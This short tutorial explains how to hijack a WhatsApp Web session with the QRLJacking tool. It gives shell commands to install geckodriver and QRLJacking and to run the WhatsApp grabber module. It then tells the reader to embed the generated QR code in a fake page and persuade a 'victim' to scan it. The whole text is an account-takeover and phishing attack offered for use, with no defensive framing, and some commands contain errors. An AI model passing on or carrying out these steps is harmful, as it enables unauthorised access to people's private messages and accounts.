Due to different authentication of whatsapp it can not be hacked with usual method. When scan the Whtasapp QR respect to the session it generates a hidden authentication key. And give access to the user. Here we hijack this QR session. Lets follow the steps....

Requirements :

1. Geckodriver
2. python3
3. pip3
4. QRLJacking Tool

Now write down the following command & Excecute this...

$ sudo su
$ apt-get update
$ apt-get upgrade
$ wget https://github.com/mozilla/geckodriver/releases/download/v0.26.0/geckodriver-v0.26.0-linux32.tar.gz
$ tar -xvzf geckodriver-v0.26.0-linux32.tar.gz
$ mv - f geckodriver /usr/local/share/geckodriver
$ ln -s /usr/local/share/geckodriver /usr/local/share/geckodriver
$ git clone https://github.com/OWASP/QRLJacking.git
$ cd QRLJacking
$ pip3 install -r requirements.txt
$ python3 QrlJacker.py

Now select & enter parameter in the QRLJacking module.

>>> QrlJacker > use grabber/whatsapp
>>> QrlJacker Module(grabber/whatsapp) > set port 4585
>>> QrlJacker Module (grabber/whatsapp) > run

Now you can see the generated dynamic QR in Firefox or any default set web browser. Push this QR to any self design page and send to victim and convinced to scan.
